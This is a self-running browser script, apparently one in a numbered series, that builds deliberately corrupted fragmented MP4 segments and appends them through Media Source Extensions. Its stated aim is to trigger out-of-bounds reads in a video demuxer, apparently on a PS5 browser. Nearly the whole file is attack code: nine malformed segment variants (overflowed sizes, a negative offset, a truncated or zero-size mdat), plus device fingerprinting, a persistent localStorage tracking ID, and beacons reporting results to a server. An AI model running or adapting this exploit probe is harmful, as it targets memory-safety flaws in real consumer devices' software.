/* press-61 — V61: real-NALU MSE corruption matrix.
   Single SourceBuffer, proven INIT (609B, avc1.42C01E, vt=1).
   Segments built programmatically with real H.264 NALUs in mdat.
   Corruption targets: sample_count, data_offset, sample_size, sequence,
   missing trun, multi-trun, truncated mdat, zero-size mdat.
   Goal: trigger demuxer OOB reads via corrupted moof/trun fields. */
(function(){
"use strict";
if(window.__p61)return; window.__p61=1;
var RID="v61x"+Date.now().toString(36).slice(-13);
function bk(s,b){try{fetch("/beacon/"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,290)})}).catch(function(){});}catch(e){}}
var HB=setInterval(function(){bk("V61-HB","hb");},2000);
bk("V61-L","press61-EXT real-NALU corruption-matrix");

/* ---- Ledger ---- */
try{
  var prev=null;try{prev=JSON.parse(localStorage.getItem("p51-ledger")||"null");}catch(e){}
  var now=Date.now();
  var cur={uid:(prev&&prev.uid)||Math.random().toString(36).slice(2,12),n:((prev&&prev.n)||0)+1,first:(prev&&prev.first)||now,last:now};
  localStorage.setItem("p51-ledger",JSON.stringify(cur));
  var rs=parseInt(localStorage.getItem("p53-restores")||"0",10)+1;
  localStorage.setItem("p53-restores",String(rs));
  bk("V61-Rled","ledger n="+(prev&&prev.n)+"->"+cur.n+" same-uid="+(prev?prev.uid===cur.uid:"n/a")+" restores="+rs);
}catch(e){bk("V61-Rled","ledger-FAIL "+e);}

/* ==== MP4 BOX CONSTRUCTION HELPERS ==== */

function u32(n){
  return [(n>>>24)&0xFF,(n>>>16)&0xFF,(n>>>8)&0xFF,n&0xFF];
}

function box(type,payload){
  var sz=8+payload.length;
  var out=u32(sz);
  out.push(type.charCodeAt(0),type.charCodeAt(1),type.charCodeAt(2),type.charCodeAt(3));
  for(var i=0;i<payload.length;i++)out.push(payload[i]);
  return out;
}

function fullbox(type,ver,flags,payload){
  var vf=[ver&0xFF,(flags>>>16)&0xFF,(flags>>>8)&0xFF,flags&0xFF];
  return box(type,vf.concat(payload));
}

function toBuffer(arr){
  var u=new Uint8Array(arr.length);
  for(var i=0;i<arr.length;i++)u[i]=arr[i];
  return u.buffer;
}

/* ==== H.264 NALUs (matching init avcC: Baseline 42C01E, 4-byte length prefix) ==== */

var SPS=[0x67,0x42,0xc0,0x1e,0xda,0x05,0x07,0xc4]; /* 8 bytes */
var PPS=[0x68,0xce,0x38,0x80]; /* 4 bytes */
var IDR=[0x65,0x88,0x84,0x00,0x80]; /* 5 bytes, minimal IDR slice */

function naluData(){
  /* 4-byte length-prefixed NALUs: SPS(12) + PPS(8) + IDR(9) = 29 bytes */
  var d=u32(SPS.length).concat(SPS, u32(PPS.length), PPS, u32(IDR.length), IDR);
  return d;
}

var NALU_SIZE=29; /* naluData() output size, used for moof calculations */

/* ==== MOOF COMPONENT BUILDERS ==== */

var SEQ=0;

function buildMfhd(seq){ return fullbox("mfhd",0,0,u32(seq)); } /* 16 bytes */

function buildTfhd(trackId,fl){ return fullbox("tfhd",0,fl,u32(trackId)); } /* 16 bytes */

function buildTrun(sampleCount,dataOffset,samples){
  /* flags 0x000301: data_offset_present(0x01) + sample_duration_present(0x100) + sample_size_present(0x200) */
  /* trun size = 20 + sampleCount*8 */
  var p=u32(sampleCount).concat(u32(dataOffset));
  for(var i=0;i<samples.length;i++){
    p=p.concat(u32(samples[i].dur), u32(samples[i].sz));
  }
  return fullbox("trun",0,0x000301,p);
}

/* moof size formula: 68 + totalSamples*8 (for single trun)
   For N truns with s1,s2.. samples: 68 + s1*8 + (20 + s2*8) + ... */

/* ==== SEGMENT BUILDERS — one function per corruption variant ==== */

/* S0-clean: valid moof+mdat with real NALUs (baseline, should produce buffered range) */
function buildS0(){
  SEQ++;
  var nalu=naluData();
  /* moof: 8+16+8+16+28 = 76. data_offset: 76+8 = 84 */
  var doff=84;
  var mf=buildMfhd(SEQ);
  var tf=buildTfhd(1,0x020000);
  var tr=buildTrun(1,doff,[{dur:3000,sz:NALU_SIZE}]);
  var traf=box("traf",tf.concat(tr));
  var moof=box("moof",mf.concat(traf));
  var mdat=box("mdat",nalu);
  return toBuffer(moof.concat(mdat));
}

/* S1-cnt-x4: sample_count=4 but mdat only has 29 bytes (parser reads 4*29=116 from 29) */
function buildS1(){
  SEQ++;
  var nalu=naluData();
  /* With 4 samples: trun = 20+4*8=52, traf = 8+16+52=76, moof = 8+16+76=100 */
  var doff=100+8;
  var samps=[];
  for(var i=0;i<4;i++)samps.push({dur:3000,sz:NALU_SIZE});
  var mf=buildMfhd(SEQ);
  var tf=buildTfhd(1,0x020000);
  var tr=buildTrun(4,doff,samps);
  var traf=box("traf",tf.concat(tr));
  var moof=box("moof",mf.concat(traf));
  var mdat=box("mdat",nalu); /* still only 29 bytes */
  return toBuffer(moof.concat(mdat));
}

/* S2-off-neg: data_offset = -8192 (0xFFFFE000 signed, reads 8KB before moof start) */
function buildS2(){
  SEQ++;
  var nalu=naluData();
  var mf=buildMfhd(SEQ);
  var tf=buildTfhd(1,0x020000);
  var tr=buildTrun(1,0xFFFFE000,[{dur:3000,sz:NALU_SIZE}]); /* -8192 as unsigned */
  var traf=box("traf",tf.concat(tr));
  var moof=box("moof",mf.concat(traf));
  var mdat=box("mdat",nalu);
  return toBuffer(moof.concat(mdat));
}

/* S3-sz-huge: sample_size = 0x7FFFFFFF (2GB, integer overflow in size accumulation) */
function buildS3(){
  SEQ++;
  var nalu=naluData();
  var doff=84;
  var mf=buildMfhd(SEQ);
  var tf=buildTfhd(1,0x020000);
  var tr=buildTrun(1,doff,[{dur:3000,sz:0x7FFFFFFF}]);
  var traf=box("traf",tf.concat(tr));
  var moof=box("moof",mf.concat(traf));
  var mdat=box("mdat",nalu);
  return toBuffer(moof.concat(mdat));
}

/* S4-seq-dup: sequence_number=1, same as S0 (duplicate — state confusion in sample table) */
function buildS4(){
  /* Do NOT increment SEQ — reuse seq=1 to duplicate S0's sequence */
  var nalu=naluData();
  var doff=84;
  var mf=buildMfhd(1); /* same seq as S0 */
  var tf=buildTfhd(1,0x020000);
  var tr=buildTrun(1,doff,[{dur:3000,sz:NALU_SIZE}]);
  var traf=box("traf",tf.concat(tr));
  var moof=box("moof",mf.concat(traf));
  var mdat=box("mdat",nalu);
  return toBuffer(moof.concat(mdat));
}

/* S5-no-trun: traf has tfhd but NO trun (missing sample table entirely) */
function buildS5(){
  SEQ++;
  var nalu=naluData();
  var mf=buildMfhd(SEQ);
  var tf=buildTfhd(1,0x020000);
  var traf=box("traf",tf); /* tfhd only, no trun */
  var moof=box("moof",mf.concat(traf));
  /* moof: 8+16+8+16 = 48 */
  var mdat=box("mdat",nalu);
  return toBuffer(moof.concat(mdat));
}

/* S6-multi-trun: two trun boxes in one traf (many parsers expect exactly 1) */
function buildS6(){
  SEQ++;
  var nalu=naluData();
  /* moof: 8+16+8+16+28+28 = 104. data_offset: 104+8 = 112 */
  var doff=112;
  var mf=buildMfhd(SEQ);
  var tf=buildTfhd(1,0x020000);
  var tr1=buildTrun(1,doff,[{dur:3000,sz:NALU_SIZE}]);
  var tr2=buildTrun(1,doff,[{dur:3000,sz:NALU_SIZE}]); /* same offset = overlapping reads */
  var traf=box("traf",tf.concat(tr1,tr2));
  var moof=box("moof",mf.concat(traf));
  var mdat=box("mdat",nalu);
  return toBuffer(moof.concat(mdat));
}

/* S7-mdat-short: mdat header claims 37 bytes but buffer is 4 bytes short (underflow read) */
function buildS7(){
  SEQ++;
  var nalu=naluData();
  var doff=84;
  var mf=buildMfhd(SEQ);
  var tf=buildTfhd(1,0x020000);
  var tr=buildTrun(1,doff,[{dur:3000,sz:NALU_SIZE}]);
  var traf=box("traf",tf.concat(tr));
  var moof=box("moof",mf.concat(traf));
  var mdat=box("mdat",nalu);
  var full=moof.concat(mdat);
  /* Truncate: remove last 4 bytes so mdat is physically shorter than header claims */
  return toBuffer(full.slice(0,full.length-4));
}

/* S8-mdat-zero: mdat box size=0 (extends to EOF per ISO 14496-12 — ambiguous boundary) */
function buildS8(){
  SEQ++;
  var nalu=naluData();
  var doff=84;
  var mf=buildMfhd(SEQ);
  var tf=buildTfhd(1,0x020000);
  var tr=buildTrun(1,doff,[{dur:3000,sz:NALU_SIZE}]);
  var traf=box("traf",tf.concat(tr));
  var moof=box("moof",mf.concat(traf));
  /* Build mdat manually: size=0 header + payload */
  var mdat=[0,0,0,0, 0x6D,0x64,0x61,0x74]; /* size=0 + 'mdat' */
  for(var i=0;i<nalu.length;i++)mdat.push(nalu[i]);
  return toBuffer(moof.concat(mdat));
}

/* ==== BUILD ALL SEGMENTS ==== */

var segOrder=["S0-clean","S1-cnt-x4","S2-off-neg","S3-sz-huge","S4-seq-dup","S5-no-trun","S6-multi-trun","S7-mdat-short","S8-mdat-zero"];
var builders=[buildS0,buildS1,buildS2,buildS3,buildS4,buildS5,buildS6,buildS7,buildS8];
var SEGS={};

try{
  for(var bi=0;bi<builders.length;bi++){
    SEGS[segOrder[bi]]=builders[bi]();
  }
  var szs=[];
  for(var sk=0;sk<segOrder.length;sk++){
    szs.push(segOrder[sk]+":"+SEGS[segOrder[sk]].byteLength);
  }
  bk("V61-Fsz",szs.join(","));
}catch(e){bk("V61-Fsz","build-FAIL:"+e);}

/* ==== INIT SEGMENT (proven 609B, avc1.42C01E, vt=1 on PS5 14.20) ==== */

var P61_INIT="AAAAHGZ0eXBpc29tAAACAGlzb21pc28yYXZjMQAAAkVtb292AAAAbG12aGQAAAAAAAAAAAAAAAAAAAPoAAAAAAABAAABAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAB0XRyYWsAAABgdGtoZAAAAAcAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAAUAAAADwAAAAAAFpbWRpYQAAACBtZGhkAAAAAAAAAAAAAAAAAAFfkAAAAABVxAAAAAAALmhkbHIAAAAAAAAAAHZpZGUAAAAAAAAAAAAAAAAAVmlkZW9IYW5kbGVyAAAAARNtaW5mAAAAFHZtaGQAAAABAAAAAAAAAAAAAAAkZGluZgAAABxkcmVmAAAAAAAAAAEAAAAMdXJsIAAAAAEAAADTc3RibAAAAIdzdHNkAAAAAAAAAAEAAAB3YXZjMQAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAFAAPAASAAAAEgAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABj//wAAACFhdmNDAULAHv8AAQAIZ0LAHtoFB8QAAQAEaM44gAAAABBzdHRzAAAAAAAAAAAAAAAQc3RzYwAAAAAAAAAAAAAAEHN0Y28AAAAAAAAAAAAAABRzdHN6AAAAAAAAAAAAAAAA";
var INIT;
try{
  var raw=atob(P61_INIT);
  var ia=new Uint8Array(raw.length);
  for(var ii=0;ii<raw.length;ii++)ia[ii]=raw.charCodeAt(ii);
  INIT=ia.buffer;
  bk("V61-Fdec","init-ok:"+INIT.byteLength);
}catch(e){bk("V61-Fdec","init-FAIL:"+e);INIT=null;}

/* ==== MSE SETUP + SEQUENTIAL APPEND QUEUE ==== */

var MIME='video/mp4; codecs="avc1.42C01E"';
var vid,ms,sb;
var errCount=0;
var queue=[];
var busy=false;

function trkStr(){
  var vt="?";try{vt=vid.videoTracks?vid.videoTracks.length:-1;}catch(e){vt="x";}
  var bf="?";try{var br=sb.buffered;var parts=[];for(var i=0;i<br.length;i++)parts.push("["+br.start(i).toFixed(3)+"-"+br.end(i).toFixed(3)+"]");bf=parts.length?parts.join(","):"EMPTY";}catch(e){bf="bEXC";}
  var md="?";try{md=ms.duration===Infinity?"Inf":ms.duration.toFixed(3);}catch(e){}
  var vd="?";try{vd=vid.duration===Infinity?"Inf":vid.duration.toFixed(3);}catch(e){}
  return "vt="+vt+" buf="+bf+" msd="+md+" vd="+vd+" e="+errCount;
}

function processQueue(){
  if(busy)return;
  if(queue.length===0){doProbeAndFinish();return;}
  var item=queue.shift();
  if(item.data===null){doProbeAndFinish();return;}
  var label=item.label;
  var data=item.data;

  try{
    if(ms.readyState!=="open"){
      bk("V61-R"+label,"ms-closed:"+ms.readyState+" "+trkStr());
      processQueue();
      return;
    }
    if(sb.updating){
      queue.unshift(item);
      setTimeout(processQueue,50);
      return;
    }
  }catch(e){
    bk("V61-R"+label,"state-err:"+e);
    processQueue();
    return;
  }

  busy=true;
  var t0=performance.now();

  var onDone=function(){
    var d=(performance.now()-t0).toFixed(1);
    sb.removeEventListener("updateend",onDone);
    sb.removeEventListener("error",onErrH);
    bk("V61-R"+label,"d="+d+"ms "+trkStr());
    busy=false;
    setTimeout(processQueue,10);
  };
  var onErrH=function(){
    var d=(performance.now()-t0).toFixed(1);
    sb.removeEventListener("updateend",onDone);
    sb.removeEventListener("error",onErrH);
    errCount++;
    bk("V61-R"+label,"ERR d="+d+"ms "+trkStr());
    busy=false;
    setTimeout(processQueue,10);
  };

  try{
    sb.addEventListener("updateend",onDone);
    sb.addEventListener("error",onErrH);
    sb.appendBuffer(data);
    bk("V61-E"+label,"sent "+data.byteLength+"B");
  }catch(e){
    sb.removeEventListener("updateend",onDone);
    sb.removeEventListener("error",onErrH);
    errCount++;
    bk("V61-R"+label,"EXC:"+e.name+" "+trkStr());
    busy=false;
    setTimeout(processQueue,10);
  }
}

/* ==== BOOT ==== */

function startPress(){
  vid=document.createElement("video");
  vid.muted=true;
  vid.autoplay=false;
  (document.body||document.documentElement).appendChild(vid);
  ms=new MediaSource();
  vid.src=URL.createObjectURL(ms);

  ms.addEventListener("sourceopen",function(){
    try{
      sb=ms.addSourceBuffer(MIME);
    }catch(e){
      bk("V61-Esb","addSB-EXC:"+e.name);
      finish("no-sb");
      return;
    }

    queue.push({label:"INIT",data:INIT});
    for(var qi=0;qi<segOrder.length;qi++){
      queue.push({label:segOrder[qi],data:SEGS[segOrder[qi]]});
    }
    queue.push({label:"PROBE",data:null});

    processQueue();
  });
}

/* ==== FINAL PROBES ==== */

function doProbeAndFinish(){
  try{
    var mode="?";try{mode=sb.mode;}catch(e){mode="EXC";}
    var aws="?";try{aws=sb.appendWindowStart;}catch(e){aws="EXC";}
    var ct="?";try{ct=typeof sb.changeType;}catch(e){ct="EXC";}
    var tso="?";try{tso=sb.timestampOffset;}catch(e){tso="EXC";}
    bk("V61-Rprobe","mode="+mode+" aws="+aws+" ct="+ct+" tso="+tso+" "+trkStr());
  }catch(e){bk("V61-Rprobe","EXC:"+e);}

  /* ES feature detection */
  try{
    var oc=false;try{oc=typeof eval("(a)=>a?.b")!=="undefined";}catch(e){}
    var nc=0;try{nc=eval("null??42");}catch(e){}
    var bi="?";try{bi=typeof BigInt==="function"?BigInt(6).toString():"no";}catch(e){}
    var cb=false;try{eval("try{throw 1}catch{cb=true}");cb=true;}catch(e){}
    var rab=false;try{rab=typeof ArrayBuffer.prototype.resize==="function";}catch(e){}
    var sc=false;try{sc=typeof structuredClone==="function";}catch(e){}
    bk("V61-Rfes","oc="+oc+" nc="+nc+" bi="+bi+" cb="+cb+" rab="+rab+" sc="+sc);
  }catch(e){bk("V61-Rfes","EXC:"+e);}

  /* Codec matrix + JIT timing */
  try{
    var codecs=["avc1.42C01E","avc1.640028","avc3.42C01E","hev1.1.6.L93.B0","hvc1.1.6.L93.B0","mp4v.20.9","vp09.00.10.08","flac","mp4a.40.2"];
    var cp=codecs.map(function(c){return c.split(".")[0]+":"+MediaSource.isTypeSupported('video/mp4; codecs="'+c+'"').toString()[0].toUpperCase();}).join("");
    var jt0=performance.now();for(var j1=0;j1<1e6;j1++){}var jt1=performance.now();
    var jt2=performance.now();for(var j2=0;j2<1e6;j2++){}var jt3=performance.now();
    var jit=((jt3-jt2)/(jt1-jt0)).toFixed(2);
    bk("V61-Rcap","jit="+jit+" cp["+cp+"] "+screen.width+"x"+screen.height+"@"+devicePixelRatio);
  }catch(e){bk("V61-Rcap","EXC:"+e);}

  /* WebAssembly + Worker probes */
  try{
    var wa=typeof WebAssembly==="object";
    var wk=typeof Worker==="function";
    var sw=typeof SharedWorker==="function";
    var sab=typeof SharedArrayBuffer==="function";
    bk("V61-Rfex","wasm="+wa+" worker="+wk+" shworker="+sw+" sab="+sab);
  }catch(e){bk("V61-Rfex","EXC:"+e);}

  finish("done e="+errCount);
}

function finish(reason){
  bk("V61-END","press61-"+reason);
  setTimeout(function(){clearInterval(HB);bk("V61-Z2","late-z");},26000);
}

function boot(){try{startPress();}catch(e){bk("V61-FATAL",String(e).slice(0,200));}}
if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",boot);}else{boot();}
})();
